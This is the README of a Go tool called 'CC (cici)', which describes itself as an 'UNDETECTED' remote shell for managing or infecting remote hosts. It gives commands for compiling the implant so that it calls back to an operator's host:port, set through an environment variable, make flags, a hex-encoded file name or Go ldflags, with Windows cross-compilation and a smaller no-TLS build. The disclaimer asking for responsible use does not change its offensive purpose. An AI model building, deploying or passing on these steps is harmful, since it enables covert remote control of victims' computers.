# CC (cici)

***UNDETECTED*** Remote shell for managing and/or infecting remote host(s) 🤔

### Dependencies
Golang, upx binary minifier

The target binary is ~850Kb on linux. The project can be cross-compilable to every platform supported by go/tinygo

## ⚠️ Building/Targeting

To target the remote host, you have 3 options:
 - use environment variable: `R=maci.com:5000 ./cc` 
 - use package into build with: `make remote=maci.com:5000`
 - rename the binary and encode the IP to hex like: `cc-c0a800011388` this is: 192.168.0.1:5000

***guns don't kill people. People are killing people! Use the tool responsibly!*** - Nev3rkn0wn

## Windows

Cross-compile from Linux:
```bash
make remote=192.168.1.1:4444 GOOS=windows GOARCH=amd64 cc.exe
```

On Windows, the binary can be run from cmd or PowerShell:
```powershell
# Using environment variable
$env:R="192.168.1.1:4444"; .\cc.exe

# Or rename the binary to hex-encode the address
# e.g., ren cc.exe cc-c0a800011158.exe && .\cc-c0a800011158.exe
```

### TLS Support

Build without TLS (smaller binary):
```bash
go build -tags notls -trimpath -ldflags="-s -w -X 'github.com/paalgyula/cc/config.Remote=host:port'" -o cc .
```
